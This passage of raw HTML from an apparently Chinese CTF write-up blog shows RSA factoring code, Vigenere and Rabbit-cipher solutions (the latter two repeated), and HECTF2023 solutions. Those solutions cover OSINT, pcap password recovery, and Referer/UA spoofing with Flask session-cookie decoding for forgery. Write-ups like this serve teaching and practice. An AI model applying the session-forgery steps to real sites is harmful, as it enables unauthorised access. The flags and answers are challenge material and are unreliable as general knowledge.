class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mopen">(</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">展</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">q1 = gcd(n1,(h1*<span class="built_in">pow</span>(<span class="number">2021</span>,<span class="number">202020</span>,n1))%n1-(<span class="built_in">pow</span>(<span class="number">2020</span>*(h2-<span class="number">212121</span>),<span class="number">202020</span>,n1))%n1)</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>3</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mi>p</mi><mn>2</mn><mo>+</mo><mn>2021</mn><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">h3=(2020p2+2021q2)^{202020}mod\ n2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">2</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>4</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2021</mn><mi>p</mi><mn>2</mn><mo>+</mo><mn>2020</mn><mi>q</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mn>212121</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">h4=(2021p2+2020q2)^{212121}mod\ n2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">2</span></span></span></span><br />以下思路与上一题一致<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mn>202020</mn><mo separator="true">,</mo><mn>212121</mn><mo stretchy="false">)</mo><mo>=</mo><mn>10101</mn></mrow><annotation encoding="application/x-tex">gcd(202020,212121)=10101</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mn>10101</mn><mo>∗</mo><mn>20</mn><mo>∗</mo><mn>21</mn></mrow><annotation encoding="application/x-tex">k=10101*20*21</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><msup><mn>3</mn><mn>21</mn></msup><mo>∗</mo><mn>202</mn><msup><mn>0</mn><mi>k</mi></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mn>2021</mn><mo>∗</mo><mi>q</mi><mn>2</mn><mo>+</mo><mn>202</mn><msup><mn>0</mn><mn>2</mn></msup><mo>∗</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">h3^{21}*2020^{k}\equiv(2020*2021*q2+2020^{2}*p2)^{k}mod\ n2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">2</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><msup><mn>4</mn><mn>22</mn></msup><mo>∗</mo><mn>202</mn><msup><mn>1</mn><mi>k</mi></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mn>2021</mn><mo>∗</mo><mi>q</mi><mn>2</mn><mo>+</mo><mn>202</mn><msup><mn>1</mn><mn>2</mn></msup><mo>∗</mo><mi>p</mi><mn>2</mn><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">h4^{22}*2021^{k}\equiv(2020*2021*q2+2021^{2}*p2)^{k}mod\ n2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">2</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><msup><mn>2</mn><mi>k</mi></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>h</mi><msup><mn>3</mn><mn>21</mn></msup><mo>∗</mo><mn>202</mn><msup><mn>0</mn><mi>k</mi></msup><mo>−</mo><mi>h</mi><msup><mn>4</mn><mn>20</mn></msup><mo>∗</mo><mn>202</mn><msup><mn>1</mn><mi>k</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>202</mn><msup><mn>0</mn><mn>2</mn></msup><mo>−</mo><mn>202</mn><msup><mn>1</mn><mn>2</mn></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">p2^{k}\equiv(h3^{21}*2020^{k}-h4^{20}*2021^{k})(2020^{2}-2021^{2})^{-1}mod\ n2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.932438em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">2</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>同理可得</mtext><mi>q</mi><mn>2</mn><mo separator="true">,</mo><mtext>原理不是很懂，为什么两式可以这样相减呢</mtext></mrow><annotation encoding="application/x-tex">同理可得q2,原理不是很懂，为什么两式可以这样相减呢</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">很</span><span class="mord cjk_fallback">懂</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">什</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">减</span><span class="mord cjk_fallback">呢</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a1 = <span class="built_in">pow</span>(h3,<span class="number">21</span>,n2)*<span class="built_in">pow</span>(<span class="number">2020</span>,k,n2)-<span class="built_in">pow</span>(h4,<span class="number">20</span>,n2)*<span class="built_in">pow</span>(<span class="number">2021</span>,k,n2)</span><br><span class="line">a2 = <span class="built_in">pow</span>(h3,<span class="number">20</span>,n2)*<span class="built_in">pow</span>(<span class="number">2021</span>,k,n2)-<span class="built_in">pow</span>(h4,<span class="number">21</span>,n2)*<span class="built_in">pow</span>(<span class="number">2020</span>,k,n2)</span><br><span class="line">k1 = inverse(<span class="built_in">pow</span>(<span class="number">2020</span>,<span class="number">2</span>*k,n2)-<span class="built_in">pow</span>(<span class="number">2021</span>,<span class="number">2</span>*k,n2), n2)</span><br><span class="line">k2 = inverse(<span class="built_in">pow</span>(<span class="number">2021</span>,<span class="number">2</span>*k,n2)-<span class="built_in">pow</span>(<span class="number">2020</span>,<span class="number">2</span>*k,n2), n2)</span><br><span class="line">p2k = a1 * k1 % n2</span><br><span class="line">q2k = a2 * k2 % n2</span><br><span class="line">p = gmpy2.gcd(p2k, n2)</span><br><span class="line">q = gmpy2.gcd(q2k, n2)</span><br></pre></td></tr></table></figure><h2 id="crypto-关键的vigenere"><a class="markdownIt-Anchor" href="#crypto-关键的vigenere"></a> crypto-关键的Vigenere</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FNY CQ HLQSEPNVJ</span><br><span class="line">提示：Keyword</span><br></pre></td></tr></table></figure><p>很明显，关键字密码<br />那么秘钥只能是Vigenere了<br />得出Vigenere的秘钥是，LOSTDREAM<br />再Vigenere-decode</p><h2 id="crypto-兔帽的奇妙冒险"><a class="markdownIt-Anchor" href="#crypto-兔帽的奇妙冒险"></a> crypto-兔帽的奇妙冒险</h2><p>base64解码得到，8TwsNQLAJ3d7BLjDiSmkaXLqIxkdZ7INCUdd95ECbTHMUqzQBOasxj34kltI0=<br />这里考察到了兔子流密码的认识，它类似于base64编码的组成，可能以=结尾，最大的特征为，以U2FsdGVkX1开头！！！<br />所以补充缺少头：U2FsdGVkX18TwsNQLAJ3d7BLjDiSmkaXLqIxkdZ7INCUdd95ECbTHMUqzQBOasxj34kltI0=</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FNY CQ HLQSEPNVJ</span><br><span class="line">提示：Keyword</span><br></pre></td></tr></table></figure><p>很明显，关键字密码<br />那么秘钥只能是Vigenere了<br />得出Vigenere的秘钥是，LOSTDREAM<br />再Vigenere-decode</p><h2 id="crypto-兔帽的奇妙冒险-2"><a class="markdownIt-Anchor" href="#crypto-兔帽的奇妙冒险-2"></a> crypto-兔帽的奇妙冒险</h2><p>base64解码得到，8TwsNQLAJ3d7BLjDiSmkaXLqIxkdZ7INCUdd95ECbTHMUqzQBOasxj34kltI0=<br />这里考察到了兔子流密码的认识，它类似于base64编码的组成，可能以=结尾，最大的特征为，以U2FsdGVkX1开头！！！<br />所以补充缺少头：U2FsdGVkX18TwsNQLAJ3d7BLjDiSmkaXLqIxkdZ7INCUdd95ECbTHMUqzQBOasxj34kltI0=</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HECTF2023wp</title>
      <link href="/2024/04/01/HECTF2023wp/"/>
      <url>/2024/04/01/HECTF2023wp/</url>
      
        <content type="html"><![CDATA[<h2 id="misc-签到签退"><a class="markdownIt-Anchor" href="#misc-签到签退"></a> Misc-签到&amp;签退</h2><hr /><h2 id="misc-osint"><a class="markdownIt-Anchor" href="#misc-osint"></a> Misc-osint</h2><p>先搜酒店外景图，找到一张相似的，百度识图，河北邯郸市永年区，直接锁定永年太极广场<br /><img src="https://img-blog.csdnimg.cn/direct/6f175b95721f4f39a84cefb4c54fcb1d.jpeg" alt="在这里插入图片描述" /></p><p><strong>HECTF{河北省邯郸市永年区永年太极广场}</strong></p><h2 id="misc-ezpacp"><a class="markdownIt-Anchor" href="#misc-ezpacp"></a> Misc-ezpacp</h2><p>导出对象-&gt;http,发现不少东西，选择的是 /POST login,追踪http流，发现一段base64编码<code>SEVMTE9IRUNURlgyejBVbTIzUkY=</code>,解码得到，<code>HELLOHECTFX2z0Um23RF</code>,<br />追踪到一个<br /><img src="https://img-blog.csdnimg.cn/direct/666aeafcee084c83b877d99093bdc32c.png" alt="在这里插入图片描述" /></p><p>导出，加密了，试一下密码<strong>X2z0Um23RF</strong>，拿到flag<br /><strong>HECTF{euLpTT3DQWhvoHhwqmSxQdZHQFccHOlfk7WWbXlg}</strong></p><h2 id="web-伪装者"><a class="markdownIt-Anchor" href="#web-伪装者"></a> Web-伪装者</h2><p>首先是referer，其次是UA头，再是session伪造<br /><a href="http://xn--sessions-z65ms6er4w7w0cy8zbj8d.py">先利用本地的sessions.py</a>，解出</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 sessions.py eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJqb2tlciJ9.ZVhPvg<span class="number">.6</span>WsRkbssuzOuGgnG0G5Lqdqriqc</span><br><span class="line">&#123;<span class="string">&#x27;key&#x27;</span>: <span 